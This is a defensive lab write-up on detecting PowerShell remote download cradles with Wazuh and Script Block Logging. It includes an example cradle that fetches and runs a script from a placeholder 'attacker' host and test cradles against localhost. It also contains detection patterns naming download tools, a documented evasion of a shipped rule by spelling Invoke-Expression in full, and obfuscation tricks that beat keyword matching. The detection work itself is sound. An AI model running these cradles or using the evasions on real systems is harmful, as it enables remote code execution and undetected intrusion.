# Lab 05 - PowerShell Abuse (T1059.001 / T1105)

## Objective
Detect malicious PowerShell on a Windows endpoint using **Event 4104**
(Script Block Logging) - specifically the **remote download cradle**, the
pattern that turns a single line of PowerShell into initial access:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```

Nothing touches disk, nothing is installed, and no second binary runs. It is
the reason "PowerShell" and "fileless" appear in the same sentence so often.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Execution / Command and Control |
| Technique | T1059.001 - Command and Scripting Interpreter: PowerShell |
| Related | T1105 - Ingress Tool Transfer |
| Reference | https://attack.mitre.org/techniques/T1059/001/, https://attack.mitre.org/techniques/T1105/ |

## How this lab differs from Labs 01-04
Labs 01-04 followed one shape: Wazuh's shipped coverage of the event was thin
or absent, so the lab wrote the missing rule. **That premise is false here.**
Wazuh ships **46 rules (91801-91846)** dedicated to PowerShell Script Block
Logging, in `0915-win-powershell_rules.xml`, covering discovery, timestomping,
WMI abuse, registry Run-key persistence, Base64 decoding and more.

The real gap was **telemetry, not rules**. Event 4104 is written to the
**`Microsoft-Windows-PowerShell/Operational`** channel - not the Security
channel that every previous lab in this module reads. Confirmed on the manager
before writing a single rule: **zero** PowerShell/Operational events had ever
arrived. All 46 shipped rules were sitting dead for want of an event source.

Most of this lab is therefore plumbing. Two genuine detection gaps survive it,
and both were confirmed by live test rather than by reading the ruleset.

## Environment
| Component | Details |
|---|---|
| Endpoint | Windows 11 Home (agent, Wazuh v4.14.6, ID 002 `windows`) |
| Manager | Ubuntu Server, Wazuh 4.14.6 all-in-one |
| Log source | `Microsoft-Windows-PowerShell/Operational` (eventchannel) |
| Logging prereq | Script Block Logging via registry (no `gpedit` on Home) |

Agent ID confirmed with `agent_control -l` during this lab: Windows is **002**,
Kali is **001**. `02-Agent-Enrollment/README.md` previously stated Windows=003;
that was stale and has been corrected.

## Prerequisite 0 - endpoint disk (this blocked the lab)
`C:` was at **effectively zero free space** (under 5 MB; Lab 04 recorded ~30 MB
and it had degraded further). Enabling a new event channel on a full system
volume is how you corrupt an endpoint, so the disk was fixed first.

The VDI had already been cloned to a dynamic 64 GB disk in an earlier session,
but `C:` could not be extended because a **recovery partition sat between `C:`
and the free space**:

| Part | Type | Size | Offset |
|---|---|---|---|
| 1 | Recovery | 0.29 GB | 0 |
| 2 | System (EFI) | 0.10 GB | 0.29 |
| 3 | Reserved (MSR) | 0.12 GB | 0.39 |
| 4 | **C:** | 23.72 GB | 0.52 |
| 5 | **Recovery** | 0.76 GB | 24.24 |

The documented procedure is `reagentc /disable` (which relocates `winre.wim`
into `C:\Windows\System32\Recovery`) and then delete the partition - but that
**requires free space on `C:`, which did not exist**. The order was inverted:
delete first, extend, then re-enable WinRE once there was room.

```powershell
"select disk 0`nselect partition 5`ndelete partition override" | diskpart
$max = (Get-PartitionSupportedSize -DiskNumber 0 -PartitionNumber 4).SizeMax
Resize-Partition -DiskNumber 0 -PartitionNumber 4 -Size $max
reagentc /enable
```

`Remove-Partition` will not do this - GPT recovery partitions carry the
`GPT_ATTRIBUTE_PLATFORM_REQUIRED` flag, so `diskpart ... override` is required.
Deleting it does not affect boot (that is partition 2 plus the BCD); WinRE is
simply unavailable until re-enabled. A VM snapshot was taken first.

Result: **`C:` 23.7 GB / 0 free -> 63.5 GB / 39.6 GB free.** This also unblocks
Sysmon for Module 05.

## Prerequisite 1 - enable Script Block Logging (on the endpoint)
Windows 11 **Home** has no `gpedit.msc`, so this is registry-only:

```powershell
$k = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $k -Force | Out-Null
New-ItemProperty -Path $k -Name EnableScriptBlockLogging -PropertyType DWord -Value 1 -Force | Out-Null

wevtutil sl Microsoft-Windows-PowerShell/Operational /ms:20971520
```

`EnableScriptBlockInvocationLogging` was deliberately **left off** - it adds
4105/4106 start/stop pairs for every block and floods the channel for no
detection value. The 20 MB cap is a lab-hygiene control on an endpoint that had
just run out of disk.

Note: a small number of 4104 events exist **even with this policy disabled** -
PowerShell always logs script blocks it considers suspicious, at Warning level.
Full coverage of *every* block is what the policy above adds.

## Prerequisite 2 - subscribe the agent (centralized, not on the endpoint)
The agent must be told to read the new channel. Rather than hand-edit
`ossec.conf` on a box with no SSH, this was pushed from the manager using a
dedicated agent group:

```bash
/var/ossec/bin/agent_groups -a -g windows -q
/var/ossec/bin/agent_groups -a -i 002 -g windows -q
```

`/var/ossec/etc/shared/windows/agent.conf`:

```xml
<agent_config>
  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</agent_config>
```

A dedicated group rather than the `default` group keeps a Windows-only
eventchannel off the Linux agent (001), which would log a collector error for a
channel that cannot exist on Linux. Agent 002 becomes a member of the
multigroup `default,windows`; verified by confirming the localfile appears in
the generated `/var/ossec/var/multigroups/<hash>/merged.mg`.

## The two gaps that survive the telemetry fix

### Gap 1 - no web-download coverage anywhere in the shipped ruleset
Grepping the entire shipped ruleset for `DownloadString`, `DownloadFile`,
`Invoke-WebRequest` or `Invoke-RestMethod` returns hits **only** in
`0800-sysmon_id_1.xml` - Sysmon Event 1 command-line rules. Sysmon is Module
05 and is not deployed here, so on a native-logs-only endpoint the download
cradle is invisible. Confirmed live: a `New-Object Net.WebClient` +
`DownloadString` script block produced **zero alerts** on the stock ruleset.

### Gap 2 - a typo in the shipped ruleset, and it is exploitable
Shipped rule **91837** reads:

```xml
<field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(Get-Content.+\-Stream|IEX|Invoke-Expresion)</field>
```

`Invoke-Expresion` is misspelled with one `s`. Neither that string nor the
literal `IEX` is a substring of the correctly-spelled `Invoke-Expression`, so
**a script that spells the cmdlet out in full evades 91837 entirely.**

Proven live, and this is the single most important result in the lab:

| Command | Stock ruleset result |
|---|---|
| `Invoke-Expression (New-Object Net.WebClient).DownloadString(...)` | **no alert at all** |
| `iex (iwr '...').Content` (identical attack, alias form) | 91837, **level 4** |

So on a default install the canonical spelling is silent, and the alias form
rates a 4 - below most alerting thresholds. Neither outcome is acceptable for
download-and-execute.

## Detection rules (on the manager)
Added to `/var/ossec/etc/rules/local_rules.xml`.

```xml
<group name="local,windows,ps_cradle,">

  <rule id="100405" level="12">
    <if_group>powershell</if_group>
    <field name="win.system.eventID">^4104$</field>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(Net\.WebClient|DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer|\b(iwr|irm|wget|curl)\b)</field>
    <description>PowerShell remote download cradle executed on $(win.system.computer) [T1105/T1059.001]</description>
    <options>no_full_log</options>
    <mitre><id>T1105</id><id>T1059.001</id></mitre>
  </rule>

  <rule id="100406" level="14">
    <if_sid>100405</if_sid>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(\bIEX\b|Invoke-Expression)</field>
    <description>PowerShell download-and-execute cradle on $(win.system.computer): remote content passed straight to Invoke-Expression [T1059.001]</description>
    <options>no_full_log</options>
    <mitre><id>T1059.001</id><id>T1105</id></mitre>
  </rule>

</group>
```

Design notes:
- **Aliases are matched explicitly** (`iwr`, `irm`, `wget`, `curl`) with word
  boundaries. `wget` and `curl` are PowerShell aliases for `Invoke-WebRequest`;
  a case- and alias-blind rule is trivially evaded. This is the main
  false-positive surface of the rule and is called out under Limitations.
- **100406 matches both spellings** of the execution primitive, closing Gap 2.
- **Level 14 vs 91837's level 4** - a cradle that pipes remote content straight
  into execution is initial access, not discovery, and should outrank it.
- **Explicit `eventID ^4104$` guard** - Lab 03's lesson: never rely on a parent
  rule to constrain which event you are actually looking at. Event ID 4104 is
  also used by an unrelated product (VIPRE, rule 90507) on a different channel.

## Bug 1 - `if_sid` on a grouping rule silently orphaned both rules
The first deployment used `<if_sid>91801</if_sid>` - the channel grouping rule -
chosen **deliberately as a hedge**. Rule 91802 gates on
`win.eventdata.ScriptBlockId` with a capital S, while its 45 children all match
`win.eventdata.scriptBlockText` with a lowercase s. If that casing were wrong,
91802 would never fire and the entire shipped subtree would be dead, so
anchoring one level higher looked like the safer choice.

**The hedge broke the rules.** `wazuh-analysisd` evaluates sibling rules
**first-match-wins** and then descends only into the winner's subtree. 91802
matches *every* script block event, so it always won, and 100405 - its sibling
under 91801 - was never evaluated at all.

Live result of that first deployment:

| Test | Script | Result |
|---|---|---|
| Positive A | `DownloadString`, no execution | **no alert** |
| Positive B | `Invoke-Expression` + `DownloadString` | **no alert** |
| Positive C | `iex (iwr ...)` | 91837 L4 only |

The same mechanism was confirmed independently **on a shipped rule** in the
same run: a `Copy-Item` script block containing `$env:` variables alerted
**91816**, never **91826** (`Copy-Item`), purely because 91816 appears earlier
in the file. Two rules, one event, first one wins.

Both premises of the hedge turned out to be wrong. The captured event shows the
real field is `scriptBlockId` (lowercase), 91802 matches it as `ScriptBlockId`
(capital), **and 91802 fires anyway** - so Wazuh matches `<field>` *names*
case-insensitively, the shipped inconsistency is harmless, and there was
nothing to hedge against.

**Fix: `<if_group>powershell</if_group>`.** Re-parenting to 91802 would have
fixed positives A and B but still lost C to 91837. `if_group` makes the rule a
child of *whichever* 918xx rule won the event, so it fires regardless of which
sibling claimed it. The custom group is named `ps_cradle` and deliberately does
**not** contain the substring `powershell`, so `if_group` cannot match these
rules against themselves.

## Bug 2 - the endpoint session cached the logging policy (cost the most time)
After enabling Script Block Logging, every test command produced **no 4104 at
all**, while the manager kept receiving 4104 events from other processes. This
looked exactly like an agent forwarding failure and was misdiagnosed as one.

Root cause: **PowerShell reads the Script Block Logging policy at session
startup and caches it for that session's lifetime.** The console used for
testing had been open since before the registry key was set, so none of its
commands were ever logged. Meanwhile Wazuh's own **SCA scan** spawns a fresh
`powershell.exe` on each run, picks up the policy, and logs normally - which is
why 4104 events kept arriving in bursts at agent startup and nowhere else.

Every one of the forwarded events was SCA's own:
`secedit /export /cfg $env:TEMP\secpol.cfg; ... Select-String PasswordHistorySize`.
Because those contain `$env:TEMP`, they fire **91816 eight times per scan** -
worth knowing before treating 91816 volume as endpoint activity.

Fix: open a genuinely new session (`Start-Process powershell -Verb RunAs`) and
test there. Verified with a unique marker string traced from the endpoint into
`archives.json`.

## Attack simulation (on the endpoint, in a session started AFTER the policy)
```powershell
Get-Process | Select-Object -First 3 | Out-Null                                          # negative control
Copy-Item "$env:windir\System32\drivers\etc\hosts" "$env:TEMP\hosts2.lab" -Force         # negative control
$w = New-Object Net.WebClient; $null = $w.DownloadString('http://127.0.0.1/lab05-d.ps1') # positive
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://127.0.0.1/lab05-e.ps1')
iex (iwr 'http://127.0.0.1/lab05-f.ps1' -UseBasicParsing).Content
```

Two points on method:

- **Each command must be run on its own line.** PowerShell submits a pasted
  multi-line block as a *single* script block, which would collapse all five
  into one event - and put the negative controls in the same event as the
  positives, voiding them. This is Lab 03's "design controls so they can stay
  silent independently" in a new form.
- **The cradles point at `127.0.0.1`, where nothing is listening.** They all
  throw `Unable to connect to the remote server`. That is intentional: there is
  zero network traffic, and the detection matches the *logged script text*, not
  a successful download. A cradle aimed at a dead host is still a cradle.

## Detection results
Confirmed firing on live endpoint telemetry, verified against negative controls
run in the same session.

```
level:       12
id:          100405
description: PowerShell remote download cradle executed on WINDOWS [T1105/T1059.001]
agent:       windows (002)
```
```
level:       14
id:          100406
description: PowerShell download-and-execute cradle on WINDOWS: remote content
             passed straight to Invoke-Expression [T1059.001]
agent:       windows (002)
```

Full test matrix, across both deployments:

| Test | Script block | Stock ruleset | `if_sid 91801` (Bug 1) | `if_group` (final) |
|---|---|---|---|---|
| NC 1 | `Get-Process` | 91815 L4 | 91815 L4 | **91815 L4 - passed** |
| NC 2 | `Copy-Item` + `$env:` | 91816 L4 | 91816 L4 | **91816 L4 - passed** |
| Pos A | `DownloadString` only | **silent** | **silent** | **100405 L12** |
| Pos B | `Invoke-Expression` + `DownloadString` | **silent** | **silent** | **100406 L14** |
| Pos C | `iex (iwr ...)` | 91837 L4 | 91837 L4 | **100406 L14** |

Both negative controls stayed on their shipped rules and never touched 100405,
so the download regex is not over-broad.

## Investigation steps
1. Open the **100406** alert - `scriptBlockText` contains the full command,
   including the URL. That URL is the immediate pivot: it identifies the
   staging host and, usually, the toolkit.
2. **Correlate backwards** - was this preceded by an unexpected admin logon
   (100401) or a brute-force burst (100400)? A cradle on a host that was just
   authenticated into is a different severity of problem than one on a
   developer workstation.
3. **Correlate forwards** - a successful cradle is followed by whatever it
   downloaded. Check for service or scheduled-task persistence (100403/100404)
   and new local accounts (100402) in the minutes after.
4. **Contain** - the payload never touched disk, so there is no file to
   quarantine. Isolate the host, block the URL/IP at egress, and treat every
   credential used on that host as exposed.

## Notes and limitations
- **`-EncodedCommand` is only partly covered.** Script Block Logging records
  the *decoded* text, so a `-enc` payload that runs is logged in cleartext and
  these rules see it. But `powershell.exe -enc <base64>` as a **command line**
  is invisible to 4104 - catching that needs Event 4688 or Sysmon Event 1. The
  shipped ruleset covers it only in `0800-sysmon_id_1.xml`, i.e. Module 05.
- **`wget` and `curl` are the false-positive surface.** They are legitimate
  PowerShell aliases and also real binaries an admin may script against. On a
  noisy production estate these two alternatives are the first thing to tune;
  on this endpoint they produced no false positives across the test run.
- **Obfuscation is not addressed.** String concatenation, backtick insertion
  (``I`E`X``), `-Join`, and char-array reconstruction all defeat a literal
  keyword match. Detecting those needs entropy or length heuristics, which is a
  different lab.
- **Detection is per-script-block, not per-session.** A multi-stage attack
  split across several small blocks may keep each individual block under the
  threshold. No correlation window was added, deliberately - see Lab 03's
  unresolved question about composite `timeframe` and manager processing time.
- **Wazuh's own SCA scan is a 4104 source** (8x 91816 per scan). Baseline it
  before interpreting PowerShell alert volume on any Wazuh-monitored endpoint.
- **JSON archives were enabled temporarily** (`logall_json`) to inspect raw
  events during diagnosis, and turned off afterwards. It is the only reliable
  way to see events that arrive but match no alerting rule - without it, "no
  alert" and "no event" look identical from the manager.

## Lessons learned
- **Check whether the gap is the ruleset or the telemetry.** The instinct from
  Labs 01-04 was "write the missing rule." Here 46 rules already existed and
  were inert for want of a log source. Auditing coverage means asking whether
  the event can reach the engine at all, not just whether a rule exists.
- **Anchoring higher in a rule tree is not safer - it can orphan the rule.**
  Wazuh sibling rules are first-match-wins. A hedge against a hypothetical bug
  created a real one, and the rules validated cleanly the entire time.
- **A shipped ruleset is not a trusted control.** 91837 contains a typo that
  lets the canonical spelling of the most-abused PowerShell primitive through
  untouched. It has presumably shipped that way for years. Vendor detections
  deserve the same negative-control testing as your own.
- **"No events" has more causes than "the pipeline is broken."** Here it was a
  cached per-session policy on the endpoint. The distinguishing evidence was
  that events *from other processes* kept arriving - a detail invisible without
  raw archives.
- **Instrument before theorising.** Two wrong root-cause theories (a reader
  stall, then a rule-tree fault) were argued from alert counts alone. Enabling
  archives and reading one raw event settled it immediately and should have
  come first.

## MITRE ATT&CK mapping
```
Command and Scripting Interpreter: PowerShell (T1059.001)
  |
  Event 4104 (PowerShell/Operational) --> 91801/91802  Level 0
       |
       +--> shipped keyword rules (91803-91846)  Level 0-14
       |       |
       |       +--> 91837 IEX / Invoke-Expresion [TYPO]  Level 4  [EVADED by full spelling]
       |
       +--> if_group: web-download method --> Rule 100405  Level 12  [DETECTED]
                 |
                 +--> plus IEX / Invoke-Expression --> Rule 100406  Level 14  [DETECTED]

Ingress Tool Transfer (T1105)
  |
  No shipped native-log coverage - Sysmon Event 1 only (Module 05) --> Rule 100405
```

## Status
Complete - Rules **100405** (level 12) and **100406** (level 14) confirmed
firing on a live Windows 11 endpoint. A download cradle without execution
raised 100405; the same cradle piped into `Invoke-Expression` raised 100406,
both in its fully-spelled and alias forms. Benign process discovery and a local
file copy stayed on their shipped rules and never touched the custom detections.

Two bugs were found, fixed and re-verified: custom rules silently orphaned by
anchoring on a grouping rule in a first-match-wins tree, and an endpoint
PowerShell session that had cached the logging policy from before it was
enabled. A third defect was found in the **shipped** Wazuh ruleset - the 91837
`Invoke-Expresion` typo - and demonstrated to be a working evasion of
download-and-execute detection on a default install.
